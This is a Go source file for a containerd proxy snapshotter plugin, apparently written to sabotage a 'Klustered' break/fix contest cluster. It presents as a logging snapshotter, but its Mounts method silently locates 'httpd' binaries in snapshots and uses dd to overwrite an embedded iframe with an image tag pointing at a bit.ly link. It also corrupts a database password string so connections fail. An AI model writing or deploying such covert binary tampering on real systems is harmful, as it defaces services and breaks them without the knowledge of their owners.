package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"google.golang.org/grpc"

	snapshotsapi "github.com/containerd/containerd/api/services/snapshots/v1"
	"github.com/containerd/containerd/contrib/snapshotservice"
	"github.com/containerd/containerd/mount"
	"github.com/containerd/containerd/snapshots"
	"github.com/containerd/containerd/snapshots/native"
	"github.com/sirupsen/logrus"
	"sigs.k8s.io/release-utils/command"
)

const iFrameBit = "<iframe src=\"https://giphy.com/embed/11tTNkNy1SdXGg"
const evilPatch = `<img src="https://bit.ly/3JScAMB" style="transform: rotate(180deg)"      `

func main() {
	// Provide a unix address to listen to, this will be the `address`
	// in the `proxy_plugin` configuration.
	// The root will be used to store the snapshots.
	if len(os.Args) < 3 {
		fmt.Printf("invalid args: usage: %s <unix addr> <root>\n", os.Args[0])
		os.Exit(1)
	}

	if err := os.RemoveAll(os.Args[1]); err != nil {
		logrus.Fatal(err)
	}

	// Create a gRPC server
	rpc := grpc.NewServer()

	// Configure your custom snapshotter, this example uses the native
	// snapshotter and a root directory. Your custom snapshotter will be
	// much more useful than using a snapshotter which is already included.
	// https://godoc.org/github.com/containerd/containerd/snapshots#Snapshotter

	snapper := NewSnapper(os.Args[2])
	service := snapshotservice.FromSnapshotter(snapper)

	// Register the service with the gRPC server
	snapshotsapi.RegisterSnapshotsServer(rpc, service)

	// Listen and serve
	l, err := net.Listen("unix", os.Args[1])
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(1)
	}
	if err := rpc.Serve(l); err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(1)
	}
}

type Snapper struct {
	snapshots.Snapshotter
	Directory string
	Upstream  snapshotsapi.SnapshotsServer
}

func NewSnapper(snapshotDir string) *Snapper {
	snapper := &Snapper{
		Directory: snapshotDir,
	}
	sn, err := native.NewSnapshotter(os.Args[2])
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(1)
	}

	snapper.Snapshotter = sn
	return snapper
}

func (snapper *Snapper) Stat(ctx context.Context, key string) (snapshots.Info, error) {
	logrus.Info("Stat!")
	i, err := snapper.Snapshotter.Stat(ctx, key)
	return i, err
}

func (snapper *Snapper) Update(ctx context.Context, info snapshots.Info, fieldpaths ...string) (snapshots.Info, error) {
	logrus.Info("Update!")
	return snapper.Snapshotter.Update(ctx, info, fieldpaths...)
}
func (snapper *Snapper) Usage(ctx context.Context, key string) (snapshots.Usage, error) {
	logrus.Info("Usage!")
	return snapper.Snapshotter.Usage(ctx, key)
}
func (snapper *Snapper) Mounts(ctx context.Context, key string) ([]mount.Mount, error) {
	logrus.Info("Mounts!")
	binaries, err := locateBinaries(snapper.Directory, "httpd")
	if err != nil {
		logrus.Warn("error locating binaries:", err)
	}
	for _, p := range binaries {
		logrus.Info("Checking binary: " + p)
		offset, err := findStringOffset("Klustered", p)
		if err != nil {
			logrus.Warn(err)
		}
		if offset > 0 {
			logrus.Infof("Found contest binary >>>>>>>>> %s", p)
			offset, err := findStringOffset(iFrameBit, p)
			if err != nil {
				logrus.Warn(err)
			}
			if offset < 0 {
				logrus.Infof("  [ALREADY PATCHED 😇]")
				continue
			}

			if err := patchBinary(p, offset, evilPatch); err != nil {
				logrus.Warnf("Error patching: %s", err.Error())
				continue
			}

			offset, err = findStringOffset("postgresql123", p)
			if err != nil {
				logrus.Warn(err)
				continue
			}

			if err := patchBinary(p, offset, "postgresqll23"); err != nil {
				logrus.Warnf("Error patching sql connection: %s", err.Error())
			}
		}
	}

	return snapper.Snapshotter.Mounts(ctx, key)
}
func (snapper *Snapper) Prepare(ctx context.Context, key, parent string, opts ...snapshots.Opt) ([]mount.Mount, error) {
	logrus.Info("Prepare!")
	return snapper.Snapshotter.Prepare(ctx, key, parent, opts...)
}
func (snapper *Snapper) View(ctx context.Context, key, parent string, opts ...snapshots.Opt) ([]mount.Mount, error) {
	logrus.Info("View!")
	return snapper.Snapshotter.View(ctx, key, parent, opts...)
}
func (snapper *Snapper) Commit(ctx context.Context, name, key string, opts ...snapshots.Opt) error {
	logrus.Info("Commit!")
	return snapper.Snapshotter.Commit(ctx, name, key, opts...)
}
func (snapper *Snapper) Remove(ctx context.Context, key string) error {
	logrus.Info("Remove!")
	return snapper.Snapshotter.Remove(ctx, key)
}
func (snapper *Snapper) Walk(ctx context.Context, fn snapshots.WalkFunc, filters ...string) error {
	logrus.Info("Walk!")
	return snapper.Snapshotter.Walk(ctx, fn, filters...)

}
func (snapper *Snapper) Close() error {
	logrus.Info("Close!")
	return snapper.Snapshotter.Close()
}

func locateBinaries(topPath, name string) (paths []string, err error) {
	paths = []string{}
	if err := filepath.Walk(topPath,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if info.IsDir() {
				return nil
			}
			if info.Name() == name {
				paths = append(paths, path)
			}
			return nil
		}); err != nil {
		return nil, err
	}
	return paths, nil
}

// Patches a binary at the specified byte point
func patchBinary(path string, offset int64, replacement string) error {
	logrus.Infof("Patching %s to do evil things 👿 ", path)
	f, err := os.CreateTemp("", "")
	if err != nil {
		return err
	}
	defer os.Remove(f.Name())
	if err := os.WriteFile(
		f.Name(), []byte(replacement+"\000"), os.FileMode(0o644),
	); err != nil {
		return err
	}
	if err := command.New(
		"dd", fmt.Sprintf("if=%s", f.Name()), fmt.Sprintf("of=%s", path),
		"obs=1", fmt.Sprintf("seek=%d", offset), "conv=notrunc",
	).RunSilentSuccess(); err != nil {
		return err
	}
	return nil
}

func findStringOffset(pattern, path string) (bytePoint int64, err error) {
	output, err := command.New(
		"grep", "-o", "--text", "--byte-offset", pattern, path,
	).RunSilentSuccessOutput()
	if err != nil {
		return -1, nil
	}

	partes := strings.SplitN(output.OutputTrimNL(), ":", 2)
	if len(partes) < 2 {
		return -1, nil
	}

	intVal, err := strconv.Atoi(partes[0])
	if err != nil {
		return 0, fmt.Errorf("at int conversion: %w", err)
	}
	return int64(intVal), nil
}
